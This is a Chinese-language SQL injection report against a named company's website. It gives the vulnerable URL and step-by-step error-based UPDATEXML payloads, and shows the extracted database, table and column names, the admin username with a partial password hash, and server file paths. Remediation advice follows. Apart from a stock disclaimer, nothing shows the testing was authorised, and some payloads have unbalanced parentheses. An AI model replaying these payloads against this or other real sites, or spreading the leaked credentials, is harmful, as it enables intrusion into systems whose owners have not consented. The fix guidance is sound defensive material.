# SQL 注入漏洞综合报告

## 1. 漏洞概述

| 项目 | 内容 |
|------|------|
| **漏洞类型** | SQL 注入（SQL Injection） |
| **漏洞等级** | 🔴 高危 |
| **影响站点** | http://www.dlhayashi.com |
| **影响范围** | 数据库信息泄露、管理员账号密码获取 |
| **漏洞状态** | ✅ 已确认 |
| **测试时间** | 2026-03-09 ~ 2026-03-10 |

## 2. 技术细节

### 2.1 漏洞位置
- **URL**：`http://www.dlhayashi.com/index.php?c=text&a=gywm&id=1`
- **注入点**：`id` 参数
- **漏洞原因**：应用程序未对用户输入进行参数化处理，直接将用户输入拼接到 SQL 语句中

### 2.2 数据库信息
| 项目 | 内容 |
|------|------|
| **数据库名称** | qdm177261645_db |
| **表名** | jm_admin |
| **字段** | id, username, password, group |

### 2.3 成功获取的数据
| 用户名 | 密码（加密） |
|--------|-------------|
| admin | 90763170887b9ef5a364fbfb115 |

## 3. 复现步骤

### 3.1 注入点确认
```
访问：http://www.dlhayashi.com/index.php?c=text&a=gywm&id=1'
结果：观察到 SQL 错误信息，确认存在 SQL 注入漏洞
```

### 3.2 字段数确定
```sql
测试 1: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=1 ORDER BY 6
结果：成功（页面正常显示）

测试 2: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=1 ORDER BY 7
结果：失败（出现 SQL 错误）

结论：查询结果有 6 列
```

### 3.3 数据库信息获取
```sql
Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10 
         AND UPDATEXML(1, CONCAT(0x7e, database()), 0x7e), 1) --

结果：成功获取数据库名 qdm177261645_db
```

### 3.4 表名获取
```sql
Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10 
         AND UPDATEXML(1, CONCAT(0x7e, 
         (SELECT GROUP_CONCAT(table_name) FROM information_schema.TABLES 
          WHERE table_schema=database()), 0x7e), 1) --

结果：成功获取表名 jm_admin, jm_en, fenlei, jm_on, jm_hdj
```

### 3.5 字段名获取
```sql
Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10 
         AND UPDATEXML(1, CONCAT(0x7e, 
         (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS 
          WHERE table_schema=database() AND table_name='jm_admin'), 0x7e), 1) --

结果：成功获取字段名 id, username, password, group
```

### 3.6 管理员账号密码获取
```sql
Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10 
         AND UPDATEXML(1, CONCAT(0x7e, 
         (SELECT CONCAT(username, ':', password) FROM jm_admin LIMIT 1), 0x7e), 1) --

结果：成功获取管理员账号密码 admin:90763170887b9ef5a364fbfb115
```

## 4. 漏洞验证

### 4.1 错误信息验证
```
SQL 错误消息："XPATH syntax error: 'qdm177261645_db'"
SQL 语句："SELECT jm_text.* FROM jm_text WHERE 10 AND UPDATEXML(1, 
         CONCAT(0x7e, database()), 0x7e), 1) -- LIMIT 1"
SQL 错误代码："7335941"
```

### 4.2 数据获取验证
```
SQL 错误消息："XPATH syntax error: 'admin:90763170887b9ef5a364fbfb115'"
SQL 语句："SELECT jm_text.* FROM jm_text WHERE 10 AND UPDATEXML(1, 
         CONCAT(0x7e, (SELECT CONCAT(username, ':', password) FROM 
         jm_admin LIMIT 1), 0x7e), 1) -- LIMIT 1"
SQL 错误代码："7335941"
```

### 4.3 技术栈信息
```
网站框架：FLEA (FLEA.php)
数据库：MySQL
服务器路径：/usr/home/qxu1587640101/htdocs/
PHP 文件：/usr/home/qxu1587640101/htdocs/libs/FLEA/FLEA/Db/Driver/Mysql.php
```

## 5. 影响分析

### 5.1 安全影响
| 影响类型 | 严重程度 | 说明 |
|---------|---------|------|
| 🔴 信息泄露 | 严重 | 攻击者可以获取数据库中的敏感信息 |
| 🔴 权限提升 | 严重 | 获取管理员账号密码后，攻击者可能登录后台管理系统 |
| 🟠 数据篡改 | 高危 | 攻击者可能修改数据库中的数据 |
| 🟠 服务器控制 | 高危 | 在某些情况下，可能通过 SQL 注入获取服务器权限 |

### 5.2 业务影响
- **网站管理权限**：管理员账号被泄露可能导致网站被恶意修改
- **客户数据**：如果数据库中存储了客户信息，可能导致客户数据泄露
- **品牌声誉**：安全漏洞可能影响公司的品牌声誉
- **合规风险**：可能违反网络安全法等相关法律法规

## 6. 修复建议

### 6.1 立即修复（24 小时内）

#### 1. 使用参数化查询
```php
// ❌ 错误示例（当前代码）
$id = $_GET['id'];
$sql = "SELECT * FROM jm_text WHERE id = $id";

// ✅ 正确示例（参数化查询）
$id = $_GET['id'];
$stmt = $db->prepare("SELECT * FROM jm_text WHERE id = ?");
$stmt->execute([$id]);
```

#### 2. 输入验证
```php
// 对 id 参数进行类型检查
$id = intval($_GET['id']);
if ($id <= 0) {
    die('Invalid ID');
}
```

#### 3. 错误处理
```php
// ❌ 不要在生产环境显示详细错误
// echo $e->getMessage();

// ✅ 记录错误日志，显示友好提示
error_log($e->getMessage());
die('系统错误，请联系管理员');
```

#### 4. 权限控制
```sql
-- 限制数据库用户权限
REVOKE ALL PRIVILEGES ON *.* FROM 'web_user'@'%';
GRANT SELECT, INSERT, UPDATE, DELETE ON qdm177261645_db.* TO 'web_user'@'%';
```

### 6.2 长期修复（1 周内）

1. **代码审计**：对整个代码库进行安全审计，查找其他潜在的 SQL 注入漏洞
2. **安全培训**：对开发人员进行安全编码培训
3. **WAF 部署**：考虑部署 Web 应用防火墙，拦截 SQL 注入攻击
4. **定期安全测试**：定期进行安全测试，及时发现和修复漏洞
5. **密码加密**：建议使用更强的密码加密算法（如 bcrypt、Argon2）

## 7. 时间线

| 时间 | 事件 | 状态 |
|------|------|------|
| 2026-03-09 | 发现 SQL 注入漏洞 | ✅ 完成 |
| 2026-03-09 | 确认注入点并确定字段数 | ✅ 完成 |
| 2026-03-09 | 获取数据库名称 | ✅ 完成 |
| 2026-03-09 | 获取表名和字段名 | ✅ 完成 |
| 2026-03-09 | 获取管理员账号密码 | ✅ 完成 |
| 2026-03-10 | 生成漏洞报告 | ✅ 完成 |

## 8. 测试工具

- **浏览器**：Chrome/Edge
- **抓包工具**：HackBar
- **测试方法**：手工测试 + 报错注入

## 9. 参考链接

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MySQL UPDATEXML 函数](https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html#function_updatexml)
- [FLEA 框架文档](https://github.com/flea-php/flea)

## 10. 结论

本报告确认了大连（林）精密铸造有限公司网站存在**高危 SQL 注入漏洞**，攻击者可以通过该漏洞获取数据库信息和管理员账号密码。

**修复优先级**：🔴 高  
**建议修复时间**：24 小时内  
**复测建议**：修复后 7 天内进行复测

---

**报告生成时间**：2026-03-10  
---

⚠️ **免责声明**：本报告仅供授权安全测试使用，未经授权不得使用本报告中的信息进行任何非法活动。
